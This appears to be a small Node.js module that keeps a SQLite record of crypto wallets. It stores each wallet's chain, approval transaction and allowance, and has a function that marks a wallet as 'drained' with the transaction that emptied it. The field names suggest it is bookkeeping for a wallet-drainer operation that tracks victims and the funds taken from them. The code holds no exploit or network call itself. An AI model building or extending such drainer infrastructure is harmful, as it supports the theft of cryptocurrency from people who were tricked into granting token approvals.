const Database = require('better-sqlite3');
const db = new Database('wallets.db');

db.exec(`
  CREATE TABLE IF NOT EXISTS wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet TEXT NOT NULL,
    chain TEXT NOT NULL,
    tx_hash TEXT,
    allowance TEXT,
    drained INTEGER DEFAULT 0,
    drain_tx TEXT,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
  );
`);

function saveWallet(wallet, chain, txHash, allowance) {
  db.prepare(`INSERT INTO wallets (wallet, chain, tx_hash, allowance) VALUES (?,?,?,?)`)
    .run(wallet, chain, txHash, allowance);
}

function getWallets() {
  return db.prepare(`SELECT * FROM wallets ORDER BY id DESC`).all();
}

function markDrained(wallet, tx) {
  db.prepare(`UPDATE wallets SET drained=1, drain_tx=? WHERE wallet=?`).run(tx, wallet);
}

module.exports = { saveWallet, getWallets, markDrained };
